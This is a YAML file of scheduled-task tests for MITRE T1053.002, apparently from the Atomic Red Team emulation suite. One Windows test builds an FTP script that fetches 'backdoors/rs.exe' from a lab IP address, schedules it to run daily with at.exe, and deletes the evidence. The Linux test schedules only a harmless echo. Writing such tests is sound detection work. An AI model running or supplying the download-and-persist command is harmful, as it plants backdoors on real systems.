atomic_tests:
- auto_generated_guid: 4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8
  description: 'Executes cmd.exe

    Note: deprecated in Windows 8+


    Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task
    that will EXECUTE THE PROGRAM at a specific time.

    '
  executor:
    command: 'echo user user1 anis > #{working_directory}\command.txt

      echo get backdoors/rs.exe #{working_directory}\rs.exe >> #{working_directory}\command.txt

      echo bye >> #{working_directory}\command.txt

      ftp -n -s:#{working_directory}\command.txt 192.168.80.138

      at #{date_time} /every:d,l,ma,me,j,v,s #{working_directory}\rs.exe

      del #{working_directory}\command.txt

      '
    elevation_required: false
    name: command_prompt
  input_arguments:
    date_time:
      default: '22:50'
      description: the specific time to execute the program
      type: string
    working_directory:
      default: C:\Users\user1\Documents
      description: the program to execute
      type: path
  name: At.exe Scheduled task
  supported_platforms:
  - windows
- auto_generated_guid: 7266d898-ac82-4ec0-97c7-436075d0d08e
  dependencies:
  - description: 'The `at` and `atd` executables must exist in the PATH

      '
    get_prereq_command: 'echo ''Please install `at` and `atd`; they were not found
      in the PATH (Package name: `at`)''

      '
    prereq_command: 'which at && which atd

      '
  - description: 'The `atd` daemon must be running

      '
    get_prereq_command: 'echo ''Please start the `atd` daemon (sysv: `service atd
      start` ; systemd: `systemctl start atd`)''

      '
    prereq_command: 'systemctl status atd || service atd status

      '
  dependency_executor_name: sh
  description: 'This test submits a command to be run in the future by the `at` daemon.

    '
  executor:
    command: 'echo "#{at_command}" | at #{time_spec}'
    elevation_required: false
    name: sh
  input_arguments:
    at_command:
      default: echo Hello from Atomic Red Team
      description: The command to be run
      type: string
    time_spec:
      default: now + 1 minute
      description: Time specification of when the command should run
      type: string
  name: At - Schedule a job
  supported_platforms:
  - linux
attack_technique: T1053.002
display_name: 'Scheduled Task/Job: At'
